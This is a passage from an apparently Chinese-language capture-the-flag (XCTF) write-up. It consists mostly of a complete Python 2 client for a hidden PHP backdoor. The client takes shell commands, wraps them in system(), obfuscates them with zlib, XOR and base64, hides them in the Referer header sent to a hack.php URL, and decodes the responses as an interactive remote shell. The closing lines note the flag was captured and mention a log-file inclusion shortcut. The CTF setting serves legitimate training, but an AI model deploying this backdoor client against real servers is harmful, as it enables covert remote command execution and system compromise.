</span><span class="lnt"> 67
</span><span class="lnt"> 68
</span><span class="lnt"> 69
</span><span class="lnt"> 70
</span><span class="lnt"> 71
</span><span class="lnt"> 72
</span><span class="lnt"> 73
</span><span class="lnt"> 74
</span><span class="lnt"> 75
</span><span class="lnt"> 76
</span><span class="lnt"> 77
</span><span class="lnt"> 78
</span><span class="lnt"> 79
</span><span class="lnt"> 80
</span><span class="lnt"> 81
</span><span class="lnt"> 82
</span><span class="lnt"> 83
</span><span class="lnt"> 84
</span><span class="lnt"> 85
</span><span class="lnt"> 86
</span><span class="lnt"> 87
</span><span class="lnt"> 88
</span><span class="lnt"> 89
</span><span class="lnt"> 90
</span><span class="lnt"> 91
</span><span class="lnt"> 92
</span><span class="lnt"> 93
</span><span class="lnt"> 94
</span><span class="lnt"> 95
</span><span class="lnt"> 96
</span><span class="lnt"> 97
</span><span class="lnt"> 98
</span><span class="lnt"> 99
</span><span class="lnt">100
</span><span class="lnt">101
</span><span class="lnt">102
</span><span class="lnt">103
</span><span class="lnt">104
</span><span class="lnt">105
</span><span class="lnt">106
</span><span class="lnt">107
</span><span class="lnt">108
</span><span class="lnt">109
</span><span class="lnt">110
</span><span class="lnt">111
</span><span class="lnt">112
</span><span class="lnt">113
</span><span class="lnt">114
</span><span class="lnt">115
</span><span class="lnt">116
</span><span class="lnt">117
</span><span class="lnt">118
</span><span class="lnt">119
</span><span class="lnt">120
</span><span class="lnt">121
</span><span class="lnt">122
</span><span class="lnt">123
</span><span class="lnt">124
</span><span class="lnt">125
</span><span class="lnt">126
</span><span class="lnt">127
</span><span class="lnt">128
</span><span class="lnt">129
</span><span class="lnt">130
</span><span class="lnt">131
</span><span class="lnt">132
</span><span class="lnt">133
</span><span class="lnt">134
</span><span class="lnt">135
</span><span class="lnt">136
</span><span class="lnt">137
</span><span class="lnt">138
</span><span class="lnt">139
</span><span class="lnt">140
</span><span class="lnt">141
</span><span class="lnt">142
</span><span class="lnt">143
</span><span class="lnt">144
</span><span class="lnt">145
</span><span class="lnt">146
</span><span class="lnt">147
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="c1"># encoding: utf-8</span>
</span></span><span class="line"><span class="cl"><span class="c1"># æ³¨æ„ä¿®æ”¹ url , keyh , keyf ç­‰å‚æ•°</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">random</span> <span class="kn">import</span> <span class="n">randint</span><span class="p">,</span><span class="n">choice</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">hashlib</span> <span class="kn">import</span> <span class="n">md5</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">urllib</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">string</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">zlib</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">base64</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">re</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># ç”¨äºç”Ÿæˆå®Œæ•´çš„ Accept-Language</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">choicePart</span><span class="p">(</span><span class="n">seq</span><span class="p">,</span><span class="n">amount</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">length</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">seq</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">length</span> <span class="o">==</span> <span class="mi">0</span> <span class="ow">or</span> <span class="n">length</span> <span class="o">&lt;</span> <span class="n">amount</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span> <span class="s1">&#39;Error Input&#39;</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="kc">None</span>
</span></span><span class="line"><span class="cl">    <span class="n">result</span> <span class="o">=</span> <span class="p">[]</span>    <span class="c1"># ç»“æœ</span>
</span></span><span class="line"><span class="cl">    <span class="n">indexes</span> <span class="o">=</span> <span class="p">[]</span>    <span class="c1"># ç´¢å¼•</span>
</span></span><span class="line"><span class="cl">    <span class="n">count</span> <span class="o">=</span> <span class="mi">0</span>
</span></span><span class="line"><span class="cl">    <span class="k">while</span> <span class="n">count</span> <span class="o">&lt;</span> <span class="n">amount</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">i</span> <span class="o">=</span> <span class="n">randint</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="n">length</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="ow">not</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">indexes</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">indexes</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="n">result</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">seq</span><span class="p">[</span><span class="n">i</span><span class="p">])</span>
</span></span><span class="line"><span class="cl">            <span class="n">count</span> <span class="o">+=</span> <span class="mi">1</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="n">count</span> <span class="o">==</span> <span class="n">amount</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="k">return</span> <span class="n">result</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># ç”Ÿæˆéšæœºå¡«å……å­—ç¬¦ä¸²( ç”±æ‰€æœ‰ ASCII å­—ç¬¦ç»„æˆ , åŒ…æ‹¬ä¸å¯è¯»çš„å­—ç¬¦ )</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">randBytesFlow</span><span class="p">(</span><span class="n">amount</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">result</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">xrange</span><span class="p">(</span><span class="n">amount</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="n">result</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span><span class="n">randint</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">255</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span>  <span class="n">result</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># ç”Ÿæˆéšæœºå¡«å……å­—ç¬¦ä¸²( ç”±æ‰€æœ‰å¤§å°å†™å­—æ¯ç»„æˆ )</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">randAlpha</span><span class="p">(</span><span class="n">amount</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">result</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">xrange</span><span class="p">(</span><span class="n">amount</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="c1"># choice() æ–¹æ³•è¿”å›ä¸€ä¸ªåˆ—è¡¨ï¼Œå…ƒç»„æˆ–å­—ç¬¦ä¸²çš„éšæœºé¡¹</span>
</span></span><span class="line"><span class="cl">        <span class="c1"># string.ascii_letters ä¼šç”Ÿæˆæ‰€æœ‰çš„å­—æ¯</span>
</span></span><span class="line"><span class="cl">        <span class="n">result</span> <span class="o">+=</span> <span class="n">choice</span><span class="p">(</span><span class="n">string</span><span class="o">.</span><span class="n">ascii_letters</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">result</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># æ¨¡æ‹Ÿ x() å‡½æ•° , å¾ªç¯å¼‚æˆ–åŠ å¯†</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">loopXor</span><span class="p">(</span><span class="n">text</span><span class="p">,</span><span class="n">key</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">result</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
</span></span><span class="line"><span class="cl">    <span class="n">lenKey</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">key</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">lenTxt</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">text</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">iTxt</span> <span class="o">=</span> <span class="mi">0</span>
</span></span><span class="line"><span class="cl">    <span class="k">while</span> <span class="n">iTxt</span> <span class="o">&lt;</span> <span class="n">lenTxt</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">iKey</span> <span class="o">=</span> <span class="mi">0</span>
</span></span><span class="line"><span class="cl">        <span class="k">while</span> <span class="n">iTxt</span><span class="o">&lt;</span><span class="n">lenTxt</span> <span class="ow">and</span> <span class="n">iKey</span><span class="o">&lt;</span><span class="n">lenKey</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">result</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="n">key</span><span class="p">[</span><span class="n">iKey</span><span class="p">])</span> <span class="o">^</span> <span class="nb">ord</span><span class="p">(</span><span class="n">text</span><span class="p">[</span><span class="n">iTxt</span><span class="p">]))</span>
</span></span><span class="line"><span class="cl">            <span class="n">iTxt</span> <span class="o">+=</span> <span class="mi">1</span>
</span></span><span class="line"><span class="cl">            <span class="n">iKey</span> <span class="o">+=</span> <span class="mi">1</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">result</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># å¼€å¯ Debug é€‰é¡¹</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">debugPrint</span><span class="p">(</span><span class="n">msg</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">debugging</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span> <span class="n">msg</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># å®šä¹‰åŸºæœ¬å˜é‡</span>
</span></span><span class="line"><span class="cl"><span class="n">debugging</span> <span class="o">=</span> <span class="kc">False</span>    <span class="c1"># é»˜è®¤å…³é—­ Debug , å¯ç”¨ True å¼€å¯</span>
</span></span><span class="line"><span class="cl"><span class="n">keyh</span> <span class="o">=</span> <span class="s2">&#34;42f7&#34;</span>    <span class="c1"># $kh , éœ€è¦ä¿®æ”¹</span>
</span></span><span class="line"><span class="cl"><span class="n">keyf</span> <span class="o">=</span> <span class="s2">&#34;e9ac&#34;</span>    <span class="c1"># $kf , éœ€è¦ä¿®æ”¹</span>
</span></span><span class="line"><span class="cl"><span class="n">xorKey</span> <span class="o">=</span> <span class="n">keyh</span> <span class="o">+</span> <span class="n">keyf</span>    <span class="c1"># $k</span>
</span></span><span class="line"><span class="cl"><span class="n">url</span> <span class="o">=</span> <span class="s1">&#39;http://61.147.171.105:65362/hack.php&#39;</span>    <span class="c1"># æŒ‡å®š URL  , éœ€è¦ä¿®æ”¹</span>
</span></span><span class="line"><span class="cl"><span class="n">defaultLang</span> <span class="o">=</span> <span class="s1">&#39;zh-CN&#39;</span>    <span class="c1">#é»˜è®¤Language</span>
</span></span><span class="line"><span class="cl"><span class="n">languages</span> <span class="o">=</span> <span class="p">[</span><span class="s1">&#39;zh-TW;q=0.</span><span class="si">%d</span><span class="s1">&#39;</span><span class="p">,</span><span class="s1">&#39;zh-HK;q=0.</span><span class="si">%d</span><span class="s1">&#39;</span><span class="p">,</span><span class="s1">&#39;en-US;q=0.</span><span class="si">%d</span><span class="s1">&#39;</span><span class="p">,</span><span class="s1">&#39;en;q=0.</span><span class="si">%d</span><span class="s1">&#39;</span><span class="p">]</span>    <span class="c1">#Accept-Language æ¨¡æ¿</span>
</span></span><span class="line"><span class="cl"><span class="n">proxies</span> <span class="o">=</span> <span class="kc">None</span>    <span class="c1"># {&#39;http&#39;:&#39;http://127.0.0.1:8080&#39;} # ä»£ç† , å¯ç”¨äº BurpSuite ç­‰</span>
</span></span><span class="line"><span class="cl"><span class="n">sess</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">Session</span><span class="p">()</span>    <span class="c1"># åˆ›å»ºä¸€ä¸ª SESSION å¯¹è±¡</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># æ¯æ¬¡ä¼šè¯ä¼šäº§ç”Ÿä¸€æ¬¡éšæœºçš„ Accept-Language</span>
</span></span><span class="line"><span class="cl"><span class="n">langTmp</span> <span class="o">=</span> <span class="n">choicePart</span><span class="p">(</span><span class="n">languages</span><span class="p">,</span><span class="mi">3</span><span class="p">)</span>    <span class="c1"># è¾“å‡ºä¸€ä¸ªåˆ—è¡¨ , åŒ…å«æ¨¡æ¿ä¸­çš„ä¸‰ç§ Accept-language</span>
</span></span><span class="line"><span class="cl"><span class="n">indexes</span> <span class="o">=</span> <span class="nb">sorted</span><span class="p">(</span><span class="n">choicePart</span><span class="p">(</span><span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">10</span><span class="p">),</span><span class="mi">3</span><span class="p">),</span> <span class="n">reverse</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>    <span class="c1"># é™åºæ’åºè¾“å‡ºä¸‰ä¸ªæƒé‡å€¼ , ä¾‹å¦‚ [8,6,4]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">acceptLang</span> <span class="o">=</span> <span class="p">[</span><span class="n">defaultLang</span><span class="p">]</span>   <span class="c1"># å…ˆæ·»åŠ é»˜è®¤Language</span>
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">xrange</span><span class="p">(</span><span class="mi">3</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">acceptLang</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">langTmp</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">%</span> <span class="p">(</span><span class="n">indexes</span><span class="p">[</span><span class="n">i</span><span class="p">],))</span>    <span class="c1"># ç„¶åå¾ªç¯æ·»åŠ ä¸‰ç§ Accept-Language , å¹¶ä¸ºå…¶æ·»åŠ æƒé‡å€¼</span>
</span></span><span class="line"><span class="cl"><span class="n">acceptLangStr</span> <span class="o">=</span> <span class="s1">&#39;,&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">acceptLang</span><span class="p">)</span>    <span class="c1"># å°†å¤šä¸ª Accept-Language ç”¨ &#34; , &#34; æ‹¼æ¥åœ¨ä¸€èµ·</span>
</span></span><span class="line"><span class="cl"><span class="c1"># acceptLangStr å³ä¸ºè¦ä½¿ç”¨çš„ Accept-Language</span>
</span></span><span class="line"><span class="cl"><span class="n">debugPrint</span><span class="p">(</span><span class="n">acceptLangStr</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">init2Char</span> <span class="o">=</span> <span class="n">acceptLang</span><span class="p">[</span><span class="mi">0</span><span class="p">][</span><span class="mi">0</span><span class="p">]</span> <span class="o">+</span> <span class="n">acceptLang</span><span class="p">[</span><span class="mi">1</span><span class="p">][</span><span class="mi">0</span><span class="p">]</span>    <span class="c1"># $i</span>
</span></span><span class="line"><span class="cl"><span class="n">md5head</span> <span class="o">=</span> <span class="p">(</span><span class="n">md5</span><span class="p">(</span><span class="n">init2Char</span> <span class="o">+</span> <span class="n">keyh</span><span class="p">)</span><span class="o">.</span><span class="n">hexdigest</span><span class="p">())[</span><span class="mi">0</span><span class="p">:</span><span class="mi">3</span><span class="p">]</span>    <span class="c1"># $h</span>
</span></span><span class="line"><span class="cl"><span class="n">md5tail</span> <span class="o">=</span> <span class="p">(</span><span class="n">md5</span><span class="p">(</span><span class="n">init2Char</span> <span class="o">+</span> <span class="n">keyf</span><span class="p">)</span><span class="o">.</span><span class="n">hexdigest</span><span class="p">())[</span><span class="mi">0</span><span class="p">:</span><span class="mi">3</span><span class="p">]</span> <span class="o">+</span> <span class="n">randAlpha</span><span class="p">(</span><span class="n">randint</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span><span class="mi">8</span><span class="p">))</span>    <span class="c1"># $f + å¡«å……å­—ç¬¦ä¸²</span>
</span></span><span class="line"><span class="cl"><span class="n">debugPrint</span><span class="p">(</span><span class="s1">&#39;$i is </span><span class="si">%s</span><span class="s1">&#39;</span> <span class="o">%</span> <span class="p">(</span><span class="n">init2Char</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="n">debugPrint</span><span class="p">(</span><span class="s1">&#39;md5 head: </span><span class="si">%s</span><span class="s1">&#39;</span> <span class="o">%</span> <span class="p">(</span><span class="n">md5head</span><span class="p">,))</span>
</span></span><span class="line"><span class="cl"><span class="n">debugPrint</span><span class="p">(</span><span class="s1">&#39;md5 tail: </span><span class="si">%s</span><span class="s1">&#39;</span> <span class="o">%</span> <span class="p">(</span><span class="n">md5tail</span><span class="p">,))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># äº¤äº’å¼ Shell</span>
</span></span><span class="line"><span class="cl"><span class="n">cmd</span> <span class="o">=</span> <span class="s2">&#34;system(&#39;&#34;</span> <span class="o">+</span> <span class="n">raw_input</span><span class="p">(</span><span class="s1">&#39;shell &gt; &#39;</span><span class="p">)</span> <span class="o">+</span> <span class="s2">&#34;&#39;);&#34;</span>
</span></span><span class="line"><span class="cl"><span class="k">while</span> <span class="n">cmd</span> <span class="o">!=</span> <span class="s1">&#39;&#39;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># åœ¨å†™å…¥ Payload å‰å¡«å……ä¸€äº›æ— å…³æ•°æ®</span>
</span></span><span class="line"><span class="cl">    <span class="n">query</span> <span class="o">=</span> <span class="p">[]</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">xrange</span><span class="p">(</span><span class="nb">max</span><span class="p">(</span><span class="n">indexes</span><span class="p">)</span><span class="o">+</span><span class="mi">1</span><span class="o">+</span><span class="n">randint</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">2</span><span class="p">)):</span>
</span></span><span class="line"><span class="cl">        <span class="n">key</span> <span class="o">=</span> <span class="n">randAlpha</span><span class="p">(</span><span class="n">randint</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span><span class="mi">6</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">        <span class="n">value</span> <span class="o">=</span> <span class="n">base64</span><span class="o">.</span><span class="n">urlsafe_b64encode</span><span class="p">(</span><span class="n">randBytesFlow</span><span class="p">(</span><span class="n">randint</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span><span class="mi">12</span><span class="p">)))</span>
</span></span><span class="line"><span class="cl">        <span class="n">query</span><span class="o">.</span><span class="n">append</span><span class="p">((</span><span class="n">key</span><span class="p">,</span> <span class="n">value</span><span class="p">))</span>    <span class="c1"># ç”Ÿæˆæ— å…³æ•°æ®å¹¶å¡«å……</span>
</span></span><span class="line"><span class="cl">    <span class="n">debugPrint</span><span class="p">(</span><span class="s1">&#39;Before insert payload:&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">debugPrint</span><span class="p">(</span><span class="n">query</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">debugPrint</span><span class="p">(</span><span class="n">urllib</span><span class="o">.</span><span class="n">urlencode</span><span class="p">(</span><span class="n">query</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1"># å¯¹ Payload è¿›è¡ŒåŠ å¯†</span>
</span></span><span class="line"><span class="cl">    <span class="n">payload</span> <span class="o">=</span> <span class="n">zlib</span><span class="o">.</span><span class="n">compress</span><span class="p">(</span><span class="n">cmd</span><span class="p">)</span>    <span class="c1"># gzcompress æ“ä½œ</span>
</span></span><span class="line"><span class="cl">    <span class="n">payload</span> <span class="o">=</span> <span class="n">loopXor</span><span class="p">(</span><span class="n">payload</span><span class="p">,</span><span class="n">xorKey</span><span class="p">)</span>    <span class="c1"># å¾ªç¯å¼‚æˆ–è¿ç®— , PHPä»£ç ä¸­çš„ x() å‡½æ•°</span>
</span></span><span class="line"><span class="cl">    <span class="n">payload</span> <span class="o">=</span> <span class="n">base64</span><span class="o">.</span><span class="n">urlsafe_b64encode</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>    <span class="c1"># base64_encode ç¼–ç </span>
</span></span><span class="line"><span class="cl">    <span class="n">payload</span> <span class="o">=</span> <span class="n">md5head</span> <span class="o">+</span> <span class="n">payload</span>    <span class="c1">#    åœ¨å¼€å¤´è¡¥å…¨$h</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1">#  å¯¹Payloadè¿›è¡Œä¿®æ”¹</span>
</span></span><span class="line"><span class="cl">    <span class="n">cutIndex</span> <span class="o">=</span> <span class="n">randint</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span><span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span><span class="o">-</span><span class="mi">3</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">payloadPieces</span> <span class="o">=</span> <span class="p">(</span><span class="n">payload</span><span class="p">[</span><span class="mi">0</span><span class="p">:</span><span class="n">cutIndex</span><span class="p">],</span> <span class="n">payload</span><span class="p">[</span><span class="n">cutIndex</span><span class="p">:],</span> <span class="n">md5tail</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">iPiece</span> <span class="o">=</span> <span class="mi">0</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">indexes</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">query</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="n">query</span><span class="p">[</span><span class="n">i</span><span class="p">][</span><span class="mi">0</span><span class="p">],</span><span class="n">payloadPieces</span><span class="p">[</span><span class="n">iPiece</span><span class="p">])</span>
</span></span><span class="line"><span class="cl">        <span class="n">iPiece</span> <span class="o">+=</span> <span class="mi">1</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># å°† Payload ä½œä¸ºæŸ¥è¯¢å­—ç¬¦ä¸²ç¼–ç æ‹¼æ¥åˆ° Referer ä¸­</span>
</span></span><span class="line"><span class="cl">    <span class="n">referer</span> <span class="o">=</span> <span class="n">url</span> <span class="o">+</span> <span class="s1">&#39;?&#39;</span> <span class="o">+</span> <span class="n">urllib</span><span class="o">.</span><span class="n">urlencode</span><span class="p">(</span><span class="n">query</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">debugPrint</span><span class="p">(</span><span class="s1">&#39;After insert payload, referer is:&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">debugPrint</span><span class="p">(</span><span class="n">query</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">debugPrint</span><span class="p">(</span><span class="n">referer</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1"># å‘é€ HTTP GET è¯·æ±‚</span>
</span></span><span class="line"><span class="cl">    <span class="n">r</span> <span class="o">=</span> <span class="n">sess</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="p">,</span><span class="n">headers</span><span class="o">=</span><span class="p">{</span><span class="s1">&#39;Accept-Language&#39;</span><span class="p">:</span><span class="n">acceptLangStr</span><span class="p">,</span><span class="s1">&#39;Referer&#39;</span><span class="p">:</span><span class="n">referer</span><span class="p">},</span><span class="n">proxies</span><span class="o">=</span><span class="n">proxies</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">html</span> <span class="o">=</span> <span class="n">r</span><span class="o">.</span><span class="n">text</span>
</span></span><span class="line"><span class="cl">    <span class="n">debugPrint</span><span class="p">(</span><span class="n">html</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1"># æ¥æ”¶å“åº”æ•°æ®åŒ…</span>
</span></span><span class="line"><span class="cl">    <span class="n">pattern</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">compile</span><span class="p">(</span><span class="sa">r</span><span class="s1">&#39;&lt;</span><span class="si">%s</span><span class="s1">&gt;(.*)&lt;/</span><span class="si">%s</span><span class="s1">&gt;&#39;</span> <span class="o">%</span> <span class="p">(</span><span class="n">xorKey</span><span class="p">,</span><span class="n">xorKey</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">    <span class="n">output</span> <span class="o">=</span> <span class="n">pattern</span><span class="o">.</span><span class="n">findall</span><span class="p">(</span><span class="n">html</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># å¦‚æœæ²¡æœ‰æ”¶åˆ°å“åº”æ•°æ®åŒ…</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">output</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span> <span class="s1">&#39;Error,  no backdoor response&#39;</span>
</span></span><span class="line"><span class="cl">        <span class="n">cmd</span> <span class="o">=</span> <span class="s2">&#34;system(&#39;&#34;</span> <span class="o">+</span> <span class="n">raw_input</span><span class="p">(</span><span class="s1">&#39;shell &gt; &#39;</span><span class="p">)</span> <span class="o">+</span> <span class="s2">&#34;&#39;);&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="k">continue</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># å¦‚æœæ”¶åˆ°å“åº”æ•°æ®åŒ… , åˆ™å¯¹å…¶è¿›è¡Œå¤„ç†</span>
</span></span><span class="line"><span class="cl">    <span class="n">output</span> <span class="o">=</span> <span class="n">output</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">    <span class="n">debugPrint</span><span class="p">(</span><span class="n">output</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">output</span> <span class="o">=</span> <span class="n">output</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s1">&#39;base64&#39;</span><span class="p">)</span>    <span class="c1"># base64_decode è§£ç </span>
</span></span><span class="line"><span class="cl">    <span class="n">output</span> <span class="o">=</span> <span class="n">loopXor</span><span class="p">(</span><span class="n">output</span><span class="p">,</span><span class="n">xorKey</span><span class="p">)</span>    <span class="c1"># å¾ªç¯å¼‚æˆ–è¿ç®—</span>
</span></span><span class="line"><span class="cl">    <span class="n">output</span> <span class="o">=</span> <span class="n">zlib</span><span class="o">.</span><span class="n">decompress</span><span class="p">(</span><span class="n">output</span><span class="p">)</span>   <span class="c1"># gzuncompress è¿ç®—</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span> <span class="n">output</span>    <span class="c1"># è¾“å‡ºå“åº”ä¿¡æ¯</span>
</span></span><span class="line"><span class="cl">    <span class="n">cmd</span> <span class="o">=</span> <span class="s2">&#34;system(&#39;&#34;</span> <span class="o">+</span> <span class="n">raw_input</span><span class="p">(</span><span class="s1">&#39;shell &gt; &#39;</span><span class="p">)</span> <span class="o">+</span> <span class="s2">&#34;&#39;);&#34;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/xctf%E5%88%B7%E9%A2%98/image-20250202113745892.png"
	width="845"
	height="147"
	srcset="/p/xctf%E5%88%B7%E9%A2%98/image-20250202113745892_hu10729150307917029102.png 480w, /p/xctf%E5%88%B7%E9%A2%98/image-20250202113745892_hu1953195010200709156.png 1024w"
	loading="lazy"
	
		alt="image-20250202113745892"
	
	
		class="gallery-image" 
		data-flex-grow="574"
		data-flex-basis="1379px"
	
></p>
<p><img src="/p/xctf%E5%88%B7%E9%A2%98/image-20250202114907681.png"
	width="569"
	height="296"
	srcset="/p/xctf%E5%88%B7%E9%A2%98/image-20250202114907681_hu9005623295630127068.png 480w, /p/xctf%E5%88%B7%E9%A2%98/image-20250202114907681_hu4079191429124468502.png 1024w"
	loading="lazy"
	
		alt="image-20250202114907681"
	
	
		class="gallery-image" 
		data-flex-grow="192"
		data-flex-basis="461px"
	
></p>
<p>å¾—åˆ°flag</p>
<p>è¿™é‡Œè¿˜æœ‰éé¢„æœŸè§£ï¼Œvar/log/nginxä¸‹æœ‰æ—¥å¿—æ–‡ä»¶ï¼Œè€Œä¸”å‰é¢fileå‚æ•°å­˜åœ¨æ–‡ä»¶åŒ…å«æ¼æ´</p>
<p>å‚è€ƒ<a class="link" href="https://blog.csdn.net/weixin_45588247/article/details/119401092"  target="_blank" rel="noopener"
